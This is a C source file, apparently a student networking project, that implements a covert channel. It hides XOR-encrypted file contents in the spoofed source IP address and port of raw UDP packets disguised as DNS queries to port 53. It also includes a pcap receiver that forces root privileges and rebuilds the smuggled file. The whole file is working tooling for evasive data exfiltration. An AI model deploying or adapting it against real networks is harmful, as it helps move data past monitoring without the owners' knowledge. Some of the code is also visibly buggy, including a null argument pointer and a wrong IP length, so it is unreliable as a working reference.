#include "eventLoop.h"

/* Local prototypes */
void packetHandler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

#define CHARSPERPACKET 6
#define DESTPORT 53
#define SIZE_IPV4_HEADER 20

typedef struct {
    FILE* fp;
    FILE* keyFile;
}FILEPOINTERS;

/*
 -- FUNCTION: covertTx
 --
 -- DATE: May 8, 2012
 --
 -- REVISIONS: (Date and Description)
 --
 -- DESIGNER: Warren Voelkl
 --
 -- PROGRAMMER: Warren Voelkl
 --
 -- INTERFACE: void covertTx(FILE *fp, int delay, const char * dest)
 --
 -- RETURNS: void
 --
 -- NOTES:
 -- This function places characters read from a file in the src ip and port
 -- fields of a ip/udp packet.  The Covert packet is recognized by the sender
 -- by the id field and the destination port of 53.
 */
void covertTx(FILE *fp, int delay, const char * dest) {
   
    in_addr_t destIp = inet_addr(dest);
    char *nic_dev;

    int payloadSize = 0; //ntohs(udp->udp_len) - SIZE_UDP_HEADER;
    int i;
    char charArray[CHARSPERPACKET];
    char errorBuffer[99999];
    int eofHit = 0;
    libnet_ptag_t ptag;
    FILE * keyFile = fopen("key", "r");
    if (keyFile == NULL) {
        systemFatal("Error opening file key");
    }

    nic_dev = pcap_lookupdev(errorBuffer);
    if (nic_dev == NULL) {
        printf("pcap_lookupdev %s\n",errorBuffer);
        exit(1);
    }

    libnet_t *libnetHandle = libnet_init(LIBNET_RAW4, nic_dev, errorBuffer);

    while (!eofHit) {

        for (i = 0; i < CHARSPERPACKET; ++i) {
            if (!eofHit) {
                char keyChar;
                charArray[i] = getc(fp); //will want to do an xor here with bytestream
                //putchar(charArray[i]);
                if (charArray[i] == EOF) {
                  eofHit = 1;
                  continue;
                }
                keyChar = getc(keyFile);
                putchar(keyChar);
                putchar('\n');
                charArray[i] = charArray[i] ^ keyChar;
                putchar(charArray[i]);
            }
            if (charArray[i] == EOF) {
                eofHit = 1;
            }
        }
        //loading array
        ushort id = 0;
        id |= 10;
        id = id << 8;
        id |= 11;

        in_addr_t srcAddr = 0;
        srcAddr |= charArray[0];
        srcAddr = srcAddr << 8;
        srcAddr |= charArray[1];
        srcAddr = srcAddr << 8;
        srcAddr |= charArray[2];
        srcAddr = srcAddr << 8;
        srcAddr |= charArray[3];

        ushort sPort = 0;
        sPort |= charArray[4];
        sPort = sPort << 8;
        sPort |= charArray[5];
        char packet [] = {0x0f, 0x67, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x64, 0x69, 0x67, 0x67, 0x03, 0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01, 0x00, 0x01};
        int packetLength = 26;

        ptag = libnet_build_udp(
            sPort,
            DESTPORT,
            SIZE_UDP_HEADER + packetLength,
            0,
            (u_char *) packet, //udp + SIZE_UDP_HEADER,
            packetLength, //payloadSize,
            libnetHandle,
            0);

        if (ptag == -1) {
            printf("FAIL2\n");
            libnet_clear_packet(libnetHandle);
            return;
        }

        ptag = libnet_build_ipv4(
               SIZE_IPV4_HEADER + SIZE_UDP_HEADER + payloadSize,
               0,
               id,
               0,
               57,
               IPPROTO_UDP,
               0,
               srcAddr,
               destIp,
               NULL,
               0,
               libnetHandle,
               0);


           if (ptag == -1) {
               printf("FAIL\n");
               libnet_clear_packet(libnetHandle);
               return;
           }



           libnet_write(libnetHandle);



           libnet_clear_packet(libnetHandle);
           usleep(delay*1000);
    }
    printf("tx done\n");
}
/*
 -- FUNCTION: pcapLoop
 --
 -- DATE: May 8, 2012
 --
 -- REVISIONS: (Date and Description)
 --
 -- DESIGNER: Warren Voelkl & luke Queenan
 --
 -- PROGRAMMER: Warren Voelkl
 --
 -- INTERFACE: void covertTx(FILE *fp, int delay, const char * dest)
 --
 -- RETURNS: void
 --
 -- NOTES:
 -- This function opens a raw socket using the libpcap library.  Then
 -- applies a filter for reading of the data in the handler function.
 */
char * pcapLoop() {
    pcap_t *handle;
    char *errorBuffer = malloc(ERRORBUFFER);
    struct bpf_program fp;
    char *filter = NULL;
    bpf_u_int32 mask;
    bpf_u_int32 net;
    char nic_dev[] = NETDEV;
    //GIMMIE ROOT
    
    static uid_t ruid, euid;
    ruid = getuid();
    euid = geteuid();
    
    
    if (setuid(0) == -1 || setegid(0) == -1 || setgid(0) == -1 || seteuid(0) == -1) {
        sprintf(errorBuffer, "-1 %i %i", ruid, euid);
        return errorBuffer;
    }

    //nic_dev = pcap_lookupdev(errorBuffer);
    //if (nic_dev == NULL) {
    //    printf("%s\n",errorBuffer);
    //    exit(1);
    //}
    if (pcap_lookupnet(nic_dev, &net, &mask, errorBuffer) == -1) {
        strncpy(errorBuffer, "Unable to get device settings on pcap_lookupnet", ERRORBUFFER);
        return errorBuffer;
    }
    char filt [] = "ip[4] = 10 and ip[5] = 11 and udp and dst port 53";
    //createFilter(filter);
    handle = pcap_open_live(nic_dev, SNAP_LEN, 0, 0, errorBuffer);
    if (handle == NULL) {
        //strncpy(errorBuffer, "Unable to open live capture", ERRORBUFFER);
        return errorBuffer;
    }
    
    if (pcap_compile(handle, &fp, filt, 0, PCAP_NETMASK_UNKNOWN) < 0) {
        strncpy(errorBuffer, "Unable to compile filter", ERRORBUFFER);
        return errorBuffer;
    }
    if (pcap_setfilter(handle, &fp) < 0) {
        strncpy(errorBuffer, "Unable to set filter", ERRORBUFFER);
        return errorBuffer;
    }
    
    if (pcap_loop(handle, -1, packetHandler, 0) < 0) {
        strncpy(errorBuffer, "Error in pcap_loop", ERRORBUFFER);
        return errorBuffer;
    }
    free(filter);
    pcap_freecode(&fp);
    pcap_close(handle);
    return 0;
}

/*
 -- FUNCTION: packetHandler
 --
 -- DATE: May 8, 2012
 --
 -- REVISIONS: (Date and Description)
 --
 -- DESIGNER: Warren Voelkl & luke Queenan
 --
 -- PROGRAMMER: Warren Voelkl
 --
 -- INTERFACE: void packetHandler(u_char *args,
 --                 const struct pcap_pkthdr *header, const u_char *packet)
 --
 -- RETURNS: void
 --
 -- NOTES:
 -- This function opens a raw socket using the libpcap library.  Then
 -- applies a filter for reading of the data in the handler function.
 */

void packetHandler(u_char *args, const struct pcap_pkthdr *header,
                   const u_char *packet) {
    
    const struct sniff_ip *ip = NULL;
    struct sniff_udp *udp = NULL;
    FILEPOINTERS* fps = (FILEPOINTERS*) args;
    int ipHeaderSize = 0;
    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    ipHeaderSize = IP_HL(ip) * 4;
    if (ipHeaderSize < 20) {
        return;
    }
    udp = (struct sniff_udp*)(packet + SIZE_ETHERNET + ipHeaderSize);

    char charArray[CHARSPERPACKET];
    charArray[0] =  ip->ip_src.s_addr >> 8 * 3;
    charArray[1] = (ip->ip_src.s_addr >> 8 * 2) & 0xff;
    charArray[2] = (ip->ip_src.s_addr >> 8 * 1) & 0xff;
    charArray[3] = (ip->ip_src.s_addr) & 0xff;

    charArray[4] = (udp->udp_sport >> 8) & 0xff;
    charArray[5] = udp->udp_sport & 0xff;
    int i;
    char keyChar;
    for (i = 0; i < CHARSPERPACKET; ++i) {
        if (charArray[i] == EOF) {
            putchar(charArray[i]);
            fclose(fps->fp);
            fclose(fps->keyFile);
            printf("EOF recieved\n");
            exit(1);
        }
        keyChar = getc(fps->keyFile);
        putchar(keyChar);
        putchar('\n');
        putc(charArray[i] ^ keyChar, fps->fp);
    }
}
 /*
 -- FUNCTION: systemFatal
 --
 -- DATE: March 12, 2011
 --
 -- REVISIONS: (Date and Description)
 --
 -- DESIGNER: Aman Abdulla
 --
 -- PROGRAMMER: Luke Queenan
 --
 -- INTERFACE: static void systemFatal(const char* message);
 --
 -- RETURNS: void
 --
 -- NOTES:
 -- This function displays an error message and shuts down the program.
 */
    
void systemFatal(const char* message) {
    perror(message);
    exit(EXIT_FAILURE);
}
     



